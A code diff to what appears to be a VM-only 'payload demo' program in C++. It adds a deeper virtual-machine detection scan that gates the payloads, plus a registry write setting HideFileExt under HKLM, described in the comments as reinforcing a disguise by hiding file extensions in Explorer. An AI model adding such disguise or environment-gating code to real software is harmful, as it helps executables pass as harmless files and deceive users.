@@ -12,6 +12,8 @@
 #include "utils/utils.h"
 #include "utils/seed.h"
 #include "utils/vmdetect.h"
+#include "utils/vmscan.h"
+#include "utils/reg.h"
 #include "easter/dates.h"
 #include "easter/desk.h"
 #include "easter/sys.h"
@@ -806,13 +808,31 @@ int main()
     // VM gate: this demo targets a virtual machine. On bare
     // metal (or when detection is inconclusive) exit without
     // running any payload. With /nogui it stays silent too.
-    if (!IsVirtualMachine())
+    //
+    // Fast checks first (CPUID + SMBIOS); when they come back
+    // negative, RunVmScan() drills deeper — recursive registry
+    // trees, filesystem, processes, modules, devices, windows —
+    // and prints a [FOUND] diagnostic per indicator to the
+    // console. It flips the gate only on genuine VM-platform
+    // evidence, never on AV/sandbox fingerprints alone.
+    if (!IsVirtualMachine() &&
+        !RunVmScan())
     {
         if (!noGui)
             ShowVmWarning();
 
         return 0;
     }
+
+    // VM confirmed: reinforce the disguise, mirroring the VBS
+    // one-liner (HideFileExt = hide file extensions in Explorer).
+    // Administrator rights are required for HKLM; the write just
+    // fails silently when the process is not elevated.
+    Reg::Write(
+        L"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\HideFileExt",
+        L"1",
+        L"REG_DWORD"
+    );
 
     // Warning popup. Ctrl+F12 opens the payload selector;
     // returns 1 to run the full demo, 0 to exit.
